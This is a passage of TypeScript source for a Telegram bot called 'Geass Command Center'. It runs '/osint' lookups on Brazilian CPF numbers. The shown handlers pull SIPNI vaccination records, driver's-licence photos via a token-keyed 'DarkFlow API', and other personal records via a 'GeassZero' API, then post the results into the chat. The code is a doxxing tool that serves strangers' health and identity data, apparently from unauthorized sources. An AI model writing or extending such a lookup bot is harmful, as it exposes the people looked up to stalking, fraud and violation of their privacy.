        `👁 <b>OSINT — 💉 SIPNI</b>\n<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n❌ CPF inválido — informe 11 dígitos\n\nEx: <code>/osint sipni 12345678901</code>`,
        { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) });
      return;
    }
    try {
      const rec = await fetchTgSipniData(cpfNum);
      await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, undefined,
        buildTgSipniText(cpfNum, rec),
        { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) });
    } catch (e) {
      await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, undefined,
        `👁 <b>OSINT — 💉 SIPNI</b>\n<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n❌ <b>Sem resultado</b>\n└ <code>${String(e).slice(0, 200)}</code>`,
        { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) });
    }
    return;
  }

  // ── DarkFlow (foto CNH) ──────────────────────────────────────────────────────
  if (tipo === "foto") {
    const cpfNum = dado.replace(/\D/g, "");
    try {
      const r = await fetch(
        `${TG_DARKFLOW_URL}?token=${TG_DARKFLOW_TOK}&modulo=foto_br&consulta=${encodeURIComponent(cpfNum)}`,
        { signal: AbortSignal.timeout(20_000) },
      );
      const j = await r.json() as { url?: string; base64?: string; error?: string; status?: number };
      if (j.error || j.status === 500 || !j.url) {
        await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, undefined,
          `👁 <b>OSINT — 📸 FOTO CNH BR</b>\n<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n❌ <b>Foto não encontrada</b>\n└ CPF: <code>${cpfNum}</code>\n└ ${j.error ?? "Sem foto cadastrada na CNH ou serviço indisponível."}`,
          { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) });
        return;
      }
      await ctx.telegram.deleteMessage(msg.chat.id, msg.message_id).catch(() => {/* ignore */});
      await ctx.replyWithPhoto(j.url, {
        caption: `📸 <b>OSINT — FOTO CNH BR</b>\n<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n└ CPF: <code>${cpfNum}</code>\n\n<i>DarkFlow API  •  Lelouch Britannia</i>`,
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
      });
    } catch (e) {
      await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, undefined,
        `❌ <b>Erro DarkFlow:</b> <code>${String(e).slice(0, 150)}</code>`,
        { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) });
    }
    return;
  }

  // ── GeassZero API ─────────────────────────────────────────────────────────────
  let resposta: string;
  try {
    const url = `${TG_GEASS_BASE}/${tipo}?dados=${encodeURIComponent(dado)}&apikey=${TG_GEASS_KEY}`;
    const r   = await fetch(url, { signal: AbortSignal.timeout(18_000) });
    const j   = await r.json() as { status?: string; resposta?: string; error?: string };
    resposta  = (j.resposta ?? j.error ?? "Sem resposta").trim();
  } catch (e) {
    await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, undefined,
      `❌ <b>Erro de conexão:</b>\n└ <code>${String(e).slice(0, 150)}</code>`,
      { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) });
    return;
  }

  const rLow = resposta.toLowerCase();
  if (rLow.includes("inválido") || rLow.includes("não encontrado") || rLow.includes("nao encontrado") || rLow.includes("verifique")) {
    await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, undefined,
      `👁 <b>OSINT — ${meta.emoji} ${meta.label.toUpperCase()}</b>\n<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n⚠️ <b>Sem resultado</b>\n└ Nenhum dado encontrado para <code>${dado}</code>\n\n<i>Verifique se o valor está correto e tente novamente.</i>`,
      { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) });
    return;
  }

  // Detect format and use the right parser
  const isBaseFormat = /BASE\s+\d+\s+CPF:/i.test(resposta);
  let text: string;
  if (isBaseFormat) {
    const baseRecords = tgParseBaseFormat(resposta);
    text = buildTgBaseText(tipo, dado, baseRecords);
  } else {
    const kvPairs  = tgParseGeass(resposta);
    const sections = tgParseSections(resposta);
    text = buildTgOsintText(tipo, dado, kvPairs, sections);
  }

  await ctx.telegram.editMessageText(
    msg.chat.id, msg.message_id, undefined,
    text.slice(0, 4090),
    { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) },
  );
});

// ── Launch ────────────────────────────────────────────────────────────────────
bot.launch(() => {
  console.log("🤖 Geass Command Center bot running...");
  void registerCommands().catch(e => console.warn("[CMDS] Failed to register commands:", e?.message));
}).catch(err => {
  const msg = String(err?.message ?? err);
  if (msg.includes("409") || msg.includes("Conflict") || msg.includes("terminated by other")) {
    console.warn("⚠️  Another Telegram bot instance is already running (production deployment).");
    console.warn("    This dev instance will exit — the production bot is handling requests.");
    process.exit(0); // Clean exit — not a failure
  }
  console.error("Bot launch error:", err);
  process.exit(1);
});

process.once("SIGINT",  () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
